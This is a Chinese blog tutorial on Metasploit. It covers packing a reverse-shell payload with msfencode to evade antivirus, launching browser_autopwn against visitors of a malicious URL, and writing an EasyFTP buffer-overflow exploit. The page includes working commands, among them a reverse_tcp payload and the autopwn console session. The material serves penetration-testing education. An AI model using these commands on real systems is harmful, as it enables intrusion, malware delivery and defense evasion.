  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">Metasploit</span></strong><strong><span style="color:#00b050;">生成的文件能否规避杀毒软件的检测？</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">有很多种方法可以规避杀毒软件的检测，本文只介绍其中的一种。我们可使</span></strong><strong> </strong><strong><span style="color:#000000;">用</span></strong><strong><span style="color:#000000;">/usr/bin/msfencode</span></strong><strong><span style="color:#000000;">目录下的</span></strong><strong><span style="color:#000000;">msfencode</span></strong><strong><span style="color:#000000;">工具，对可执行文件进行保护性封装。在使用</span></strong><strong><span style="color:#000000;"> msfpayload&nbsp; </span></strong><strong><span style="color:#000000;">程序生成可执行文件时，使用管道命令把文件内容传给</span></strong><strong><span style="color:#000000;"> msfencode </span></strong><strong><span style="color:#000000;">再生成最终文</span></strong><strong> </strong><strong><span style="color:#000000;">件。例如，下述指令将生成带有</span></strong><strong><span style="color:#000000;">reverse&nbsp;&nbsp; shell</span></strong><strong><span style="color:#000000;">的可执行文件，并对文件进行保护性封装：</span></strong><strong><span style="color:#000000;"> msfpayload&nbsp; &nbsp;&nbsp; windows/&nbsp;&nbsp;&nbsp;&nbsp; shell/reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LHOST=192.168.0.3 LPORT=32323 R &nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; &nbsp; msfencode &nbsp;-e x86/shikata_ga_nai &nbsp;&nbsp;&nbsp; -t&nbsp;&nbsp; exe&gt;/tmp/tictoe</span></strong><strong><span style="color:#000000;">。在规避检测方面，</span></strong><strong><span style="color:#000000;">staged&nbsp; payload</span></strong><strong><span style="color:#000000;">的成功率大于</span></strong><strong><span style="color:#000000;"> inlinepayload</span></strong><strong><span style="color:#000000;">。</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">自动化浏览器漏洞利用</span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">在测试较为安全的企业网络时，渗透人员往往不知从何处入手。在这种情况下，以使用电子</span></strong><strong> </strong><strong><span style="color:#000000;">设备的人员为目标，或以员工为首要目标开展社会工程学攻击可能是唯一的方向。本例将使</span></strong><strong> </strong><strong><span style="color:#000000;">用</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp; Metasploit&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">框架的客户端漏洞利用模板，以演示基于技术手段的社会工程学攻击。下面将</span></strong><strong> </strong><strong><span style="color:#000000;">介绍一款先进的辅助工具</span></strong><strong><span style="color:#000000;">——Browser&nbsp;&nbsp;&nbsp;&nbsp; autopwn</span></strong><strong><span style="color:#000000;">。在目标人员访问它构建的恶意</span></strong><strong><span style="color:#000000;">URL </span></strong><strong><span style="color:#000000;">的情况</span></strong><strong> </strong><strong><span style="color:#000000;">下，它能够识别出被测主机的浏览器类型，并根据识别结果自动从框架中选用针对该浏览器</span></strong><strong> </strong><strong><span style="color:#000000;">的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序对浏览器发起攻击。</span></strong><strong><span style="color:#00b050;">有关的指令及运行结果如下。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; &gt;&nbsp;&nbsp;&nbsp; use&nbsp; auxiliary/server/browser_autopwn</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(browser_autopwn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; show&nbsp; &nbsp;&nbsp; options</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">&nbsp;...</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(browser_autopwn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set LHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.0.3</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(browser_autopwn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set SRVPORT &nbsp; 80</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(browser_autopwn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set &nbsp;&nbsp;&nbsp; SRVHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.0.3</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(browser_autopwn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set&nbsp; &nbsp; URIPATH &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; / URIPATH&nbsp; &nbsp; =&gt;&nbsp;&nbsp; /</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(browser_autopwn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; run</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">一旦目标人员访问了恶意</span></strong><strong><span style="color:#000000;">URL</span></strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">http://192.168.0.3</span></strong><strong><span style="color:#000000;">），程序将会识别出他的</span></strong><strong><span style="color:#000000;">/</span></strong><strong><span style="color:#000000;">她的浏览器，并</span></strong><strong> </strong><strong><span style="color:#000000;">执行相应的漏洞利用程序。在此以后，我们就可以通过客户端利用程序渗透目标主机。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; auxiliary(browser_autopwn)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; sessions -i&nbsp;&nbsp; 1</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; getuid</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述信息表明，我们已经利用客户端的攻击程序成功渗透到目标主机。应当指出的是，这些</span></strong><strong><span style="color:#000000;"> Web</span></strong><strong><span style="color:#000000;">浏览器的</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序，每个都只能对特定版本的特定浏览器（例如</span></strong><strong><span style="color:#000000;">Intenet Explorer</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;"> Firefox</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Opera</span></strong><strong><span style="color:#000000;">等）进行攻击。</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">编写漏洞利用模板</span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">Metasploit </span></strong><strong><span style="color:#000000;">框架最引人注目之处在于它可以独立开发</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exploit&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">程序。本节将围绕</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp; exploit</span></strong><strong><span style="color:#000000;">开发的</span></strong><strong> </strong><strong><span style="color:#000000;">核心问题进行讨论，通过生动的例子演示使用</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp; Metasploit&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">框架的数据库构造</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp; exploit</span></strong><strong><span style="color:#000000;">的关键步</span></strong><strong> </strong><strong><span style="color:#000000;">骤。然而，在使用这个框架编写自己的</span></strong><strong><span style="color:#000000;"> exploit&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">程序之前，您需要理解一些</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp; Ruby</span></strong><strong><span style="color:#000000;">编程的基础</span></strong><strong> </strong><strong><span style="color:#000000;">知识。另外，您还需要掌握逆向工程的基本技能，并切实理解漏洞挖掘工具（如</span></strong><strong><span style="color:#000000;">fuzzers</span></strong><strong><span style="color:#000000;">和</span></strong><strong><span style="color:#000000;"> debuggers</span></strong><strong><span style="color:#000000;">）的使用方法。只有兼备上述技能，您才能按步就班地构造</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序。本节的内</span></strong><strong> </strong><strong><span style="color:#000000;">容仅作为有关研发的简略介绍，在完整程度上可能存在欠缺。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">本例将针对</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp; EasyFTP&nbsp;&nbsp; Server</span></strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">1.7.0.11&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">以下版本）编写利用</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp; MKD Command&nbsp;&nbsp;&nbsp; Stack&nbsp; Buffer Overflow&nbsp;&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">漏洞的</span></strong><strong><span style="color:#000000;">shellcode </span></strong><strong><span style="color:#000000;">程序，它能够反映编写缓冲区溢出</span></strong><strong><span style="color:#000000;">exploit </span></strong><strong><span style="color:#000000;">的大致方法。您可以针对</span></strong><strong> </strong><strong><span style="color:#000000;">其他</span></strong><strong><span style="color:#000000;">FTP</span></strong><strong><span style="color:#000000;">服务端程序的相似漏洞，举一反三地编写</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序。</span></strong><strong><span style="color:#00b050;">这个</span></strong><strong><span style="color:#00b050;">exploit</span></strong><strong><span style="color:#00b050;">的源代码的下载网址是</span></strong><strong><span style="color:#00b050;">/usr/share/metasploit- framework/modules/exploits/windows/ftp/easyftp_mkd_fixret.rb</span></strong><strong><span style="color:#00b050;">。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">总结</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">本文介绍了利用目标漏洞的几个关键点。开篇首先展示了漏洞检测的全过程，并强调了有关</span></strong><strong> </strong><strong><span style="color:#000000;">工作所需的知识和技巧。功能强大的</span></strong><strong><span style="color:#000000;">Kali&nbsp;&nbsp;&nbsp; Linux&nbsp; </span></strong><strong><span style="color:#000000;">是漏洞评估工作的利器。本章接下来列举出了</span></strong><strong> </strong><strong><span style="color:#000000;">发布各种已公布漏洞和</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序的网站。本章的最后篇幅演示了髙级漏洞利用工具集</span></strong><strong><span style="color:#000000;">—— Metasploit</span></strong><strong><span style="color:#000000;">框架。文中借助大量实例，介绍了通过各种利用漏洞获取被测目标控制权的方法。</span></strong><strong> </strong><strong><span style="color:#000000;">此外，本文还深入浅出地介绍了编写漏洞利用代码的各个环节，阐述了</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">程序的基本框架</span></strong><strong> </strong><strong><span style="color:#000000;">和编写策略。</span></strong></p> 
 </div> 
</div>
  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="https://uzstatic-360cdn.belost.xyz/theme/default/images/logo.png" alt="柚子社区">
  <div class="col-box-title name">NotBeCN</div>
  <!-- <p>最新资讯</p> -->
  <p class="contact">
    
    <a href="mailto:fandyvon@163.com" target="_blank">邮箱</a>
    
    <a href="https://uzshare.com" target="_blank">柚子社区</a>
    
    <a href="https://uzzz.org" target="_blank">找组织</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">最新</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/2019/05/14/zxh1220_90138586.html">[原创软件] [软件发布] 定时备份文件发送邮箱，不再怕数据丢失了</a></li>
    
      <li><a class="post-link" href="/2019/05/14/weixin_45037290_90140056.html">Get智能写作满月记 ——产品篇</a></li>
    
      <li><a class="post-link" href="/2019/05/14/nulio__90138386.html">《深度探索C++对象模型》..............</a></li>
    
      <li><a class="post-link" href="/2019/05/13/qq_41248707_90140031.html">mysql 多表联查之连接查询</a></li>
    
      <li><a class="post-link" href="/2019/05/13/qq_21122683_90125902.html">golang基础(二)</a></li>
    
      <li><a class="post-link" href="/2019/05/13/1557726108256.html">今日份的PTA刷题</a></li>
    
      <li><a class="post-link" href="/2019/05/12/zzzfffei_90137366.html">Android之折线图</a></li>
    
      <li><a class="post-link" href="/2019/05/12/zzzfffei_90136638.html">Android之实现选中时改变样式</a></li>
    
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">目录</div>
</div>

<div class="col-box">
  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <!-- right_sidebar -->
  <ins class="adsbygoogle"
       style="display:block"
       data-ad-client="ca-pub-8889449066804352"
       data-ad-slot="2081363239"
       data-ad-format="auto"
       data-full-width-responsive="true"></ins>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
  </script>
</div>


        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
&copy; 2019 
</div>
</footer>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-123344652-5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-123344652-5');
</script>


<script data-ad-client="ca-pub-8889449066804352" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.async = true;
  hm.src = "https://hm.baidu.com/hm.js?9b378145d7399199b371d067f4c8be96";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>




  </body>

</html>
